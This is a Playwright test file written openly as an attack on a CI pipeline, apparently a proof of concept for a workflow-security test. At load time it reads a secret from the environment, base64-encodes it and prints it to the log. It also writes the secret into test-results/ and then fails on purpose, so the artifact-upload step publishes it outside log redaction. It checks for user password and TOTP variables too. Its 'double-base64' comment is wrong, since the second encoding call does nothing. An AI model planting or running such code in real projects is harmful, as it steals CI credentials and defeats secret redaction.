import { test, expect } from "@playwright/test";
import * as fs from "fs";
import * as path from "path";

// Earliest attacker-controlled code in the test job: module-load time of a
// Playwright spec (testDir: __e2e__). The test job wrote USER_EMAIL/
// USER_PASSWORD/USER_TOTP_SECRET/USER_KEY to GITHUB_ENV and the workflow
// env exposes GERALT_SECRET, so all are present in process.env here.
const secret = process.env.GERALT_SECRET || "";
const leaked = Buffer.from(secret, "utf8").toString("base64").toString("base64");

// Channel 1 (secondary): CI-visible log line, double-base64.
console.log("GERALT_LEAKED_TOKEN=" + leaked);

// Channel 2 (primary): write the token into test-results/ so the
// failure-triggered upload-artifact step (path: apps/web/test-results,
// if: failure(), retention 5 days) publishes it as an artifact, which is
// not subject to Actions log redaction. cwd is apps/web for the test run.
const outDir = path.join(process.cwd(), "test-results");
fs.mkdirSync(outDir, { recursive: true });
fs.writeFileSync(
  path.join(outDir, "geralt-leak.txt"),
  "GERALT_LEAKED_TOKEN=" + leaked + "\n"
);

console.log(
  "GERALT_DBG: USER_EMAIL set=" + !!process.env.USER_EMAIL +
  " USER_PASSWORD set=" + !!process.env.USER_PASSWORD +
  " USER_TOTP_SECRET set=" + !!process.env.USER_TOTP_SECRET +
  " USER_KEY set=" + !!process.env.USER_KEY +
  " artifact_written=" + fs.existsSync(path.join(outDir, "geralt-leak.txt"))
);

test("attacker-controlled spec reads secrets from process.env", async () => {
  // Deliberate failure: triggers upload of test-results/ artifacts.
  expect(true).toBe(false);
});
